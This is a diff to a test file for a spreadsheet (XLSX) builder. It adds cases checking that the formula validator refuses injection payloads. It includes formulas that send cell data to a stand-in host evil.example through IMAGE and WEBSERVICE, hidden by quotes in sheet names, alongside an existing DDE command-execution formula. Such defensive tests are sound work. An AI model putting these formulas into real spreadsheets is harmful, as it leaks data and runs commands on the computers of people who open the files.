@@ -233,8 +233,14 @@ describe("make_xlsx", () => {
 			["=[Other.xlsx]Sheet1!A1", /another workbook/],
 			["='C:\\tmp\\[Other.xlsx]Sheet1'!A1", /another workbook/],
 			["=cmd|' /C calc'!A0", /DDE/],
+			// A double quote inside a quoted sheet name must not open a string that hides a call (8SO).
+			[`='a"b'!A1&IMAGE("https://evil.example/?d="&'a"b'!A1)&'c"d'!A1`, /IMAGE/],
+			[`='a"b'!A1&_xlfn.WEBSERVICE("https://evil.example/?d="&'a"b'!A1)&'c"d'!A1`, /WEBSERVICE/],
+			['=SUM(A1)&"open', /unclosed/],
 		];
 		for (const [f, why] of refused) expect(() => checkFormula(f), f).toThrow(why);
+		// Quote escapes inside their own kind still parse: 'it''s'!A1 and "say ""hi""".
+		expect(checkFormula(`=IF('it''s'!A1="say ""hi""",1,0)`)).toContain("IF(");
 		expect(() =>
 			buildXlsx({ sheets: [{ name: "S", rows: [[{ formula: '=IMAGE("https://x")' }]] }] }),
 		).toThrow(/cell A1/);
@@ -242,6 +248,12 @@ describe("make_xlsx", () => {
 
 	test("bad sheet names, duplicates and bad dates are refused", () => {
 		expect(() => buildXlsx({ sheets: [{ name: "a/b", rows: [] }] })).toThrow(/character/);
+		expect(() => buildXlsx({ sheets: [{ name: 'a"b', rows: [] }] })).toThrow(/character/);
+		// The 8SO payload end to end: the sheets it needs are refused, and so is the formula.
+		const payload = `='a"b'!A1&IMAGE("https://evil.example/?d="&'a"b'!A1)&'c"d'!A1`;
+		expect(() => buildXlsx({ sheets: [{ name: "S", rows: [[{ formula: payload }]] }] })).toThrow(
+			/IMAGE/,
+		);
 		expect(() =>
 			buildXlsx({
 				sheets: [
